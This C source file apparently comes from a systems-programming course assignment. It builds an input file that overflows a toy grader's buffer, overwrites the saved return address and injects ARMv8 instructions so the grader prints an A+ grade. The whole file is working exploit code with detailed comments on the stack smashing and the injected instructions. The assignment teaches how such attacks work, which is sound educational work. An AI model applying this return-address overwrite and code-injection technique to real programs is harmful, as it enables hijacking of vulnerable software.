/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Tom Wang and Ty Lipscomb                                   */
/*--------------------------------------------------------------------*/

/* Produces a file called dataAplus that overruns the grader's
   buffer to make it print "A+ is your grade.". The file contains:
   the student name terminated by a null byte, padding to align to
   4 bytes, six ARMv8 machine-language instructions (adr, bl, adr,
   mov, strb, b) followed by the literal byte 'A' and a null byte,
   padding to fill out the 48-byte buf, and an 8-byte little-endian
   address that overwrites getName's saved x30.

   Principle of operation: the first 48 bytes of input are copied
   from buf into the bss-section name[] array; the next 8 bytes
   overrun buf and overwrite getName's saved x30. When getName
   returns, control jumps into the injected instructions sitting
   inside name[]. Those instructions:
     1. adr x0, <addr of "A">  -- point x0 at the literal "A\0"
        embedded in name[].
     2. bl printf              -- call printf("A"), printing "A"
        without a trailing newline. bl sets x30 to the next
        injected instruction so printf returns back into our code.
     3. adr x0, <addr of grade> -- load address of grade variable.
     4. mov w1, #0x2B          -- '+' character.
     5. strb w1, [x0]          -- write '+' into grade.
     6. b main+64              -- jump to the existing
        printf("%c is your grade.\n", grade) instruction in main,
        which prints "+ is your grade.". Combined with the earlier
        "A", the user sees "A+ is your grade." followed by
        "Thank you, <name>." from main's last printf, all of which
        is indistinguishable from normal grader output.

   None of the bytes written is 0x0a, so fgetc never sees a
   premature newline. */

#include <stdio.h>
#include "miniassembler.h"


/* Takes no command-line arguments. Reads nothing from stdin. Writes
   nothing to stdout or stderr. Writes bytes to a file named
   "dataAplus" that, when supplied as input to the grader program
   (via grader.sh), will cause the grader to award a grade of A+.
   Returns 0. */

int main(void) {
    int i;
    unsigned int uiInstr;
    
/*
adr x0, addr of A string 'A' and '\0'
bl printf     printf then return to next line since bl now
adr  x0, 0x420044        x0 = address of `grade`
mov  w1, #0x41      w1 = 'A'
strb w1, [x0]        *grade = 'A'
b    0x40089c      jump to main+64 

|0x420044  |0x44    |grade      | from memorymap
|0x420058	|name[0 - 3]    | from mem oyrmap

printf("%c is your grade.\n", grade);
0x40089c <main+64>:  adrp    x0, 0x420000 <__libc_start_main@got.plt>

*/
    const unsigned long grade_addr = 0x420044UL; /* addr of grade above*/
    const unsigned long name_addr  = 0x420058UL; /* addr of name above*/
    const unsigned long printf_addr = 0x400690UL; /* addr of printf */
    const unsigned long is_grade_addr   = 0x40089cUL; /* addr of the start if printing is grade */

    /* The literal "A" format string sits 28 bytes into name. */
    const unsigned long a_string_addr   = 0x420058UL + 28UL;


    FILE *psFile;
    psFile = fopen("dataAplus", "w");

    /* The student name. These three bytes are read into buf[0..2]
       and later copied into the name array in the bss section so
       the grader prints "Thank you, Ty." */
    putc('T', psFile);
    putc('y', psFile);
    putc('\0', psFile);
    putc('\0', psFile);

   /* bytes 4-7: adr x0, 0x420074. Loads the address of the literal
   "A\0" string (which we embed at name[28], 24 bytes after this
   instruction) into x0 so it can serve as printf's format string.
   This is the 1st injected instruction, 4 bytes after name. */
   uiInstr = MiniAssembler_adr(0, a_string_addr, name_addr + 4);
   fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

   /* bytes 8-11 bl 0x400690 
   in this iteration it immedietly artificially calls printf('A). we had to add bl
   because bl automatically stores the address of the next instruction we are encoding into x30
   which tells the system where to go next otherwise this wouldnt work. */
   uiInstr = MiniAssembler_bl(printf_addr, name_addr + 8);
   fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

   /* bytes 12-15: adr x0, 0x420044. Loads the address of grade
   into x0 in preparation for writing '+' to it. 3rd injected
   instruction, 12 bytes after name. */
   uiInstr = MiniAssembler_adr(0, grade_addr, name_addr + 12);
   fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

   /* bytes 16-19: mov w1, #0x2B. Stores the ASCII value of '+'
   into w1. 4th injected instruction. */
   uiInstr = MiniAssembler_mov(1, 0x2B);
   fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

   /* Bytes 20-23: strb w1, [x0]. Stores the byte '+' at the
   address of grade, so grade is now '+'. 5th injected
   instruction. */
   uiInstr = MiniAssembler_strb(1, 0);
   fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

   /* bytes 24-27: b 0x40089c. Branches to main+64, which is the
   start of the existing printf("%c is your grade.\n", grade)
   block. Since "A" was already printed (no newline), the user
   sees "A+ is your grade." on one line. 6th injected
   instruction, 24 bytes after name. */
   uiInstr = MiniAssembler_b(is_grade_addr, name_addr + 24);
   fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

   /* Bytes 28-29: the literal byte 'A' followed by '\0', which
   serves as the format string passed to printf in the bl call
   above. */
   putc('A', psFile);
   putc('\0', psFile);
   
   /* 18 null bytes of padding. The first 30 bytes hold the name
   (4 bytes), the 6 injected instructions (24 bytes), and the
   "A\0" literal (2 bytes); these 18 zero bytes pad buf out to its
   full 48-byte length. The bytes from position 20 onward are also
   copied into name[20..47] but never reach the "Thank you" printf
   because the name string is already terminated by the \0 at
   name[2]. 30 + 18 = 48. */
   for (i = 0; i < 18; i++) {
      putc(0x00, psFile);
   }

   /* Bytes 48-55: 8 bytes, little-endian, forming the address
       0x000000000042005C = name_addr + 4. Overwrites getName's
       saved x30, so that when getName returns, control jumps to
       the first injected instruction.  */
   putc(0x5C, psFile);
   putc(0x00, psFile);
   putc(0x42, psFile);
   putc(0x00, psFile);
   putc(0x00, psFile);
   putc(0x00, psFile);
   putc(0x00, psFile);
   putc(0x00, psFile);
   
   return 0;
}
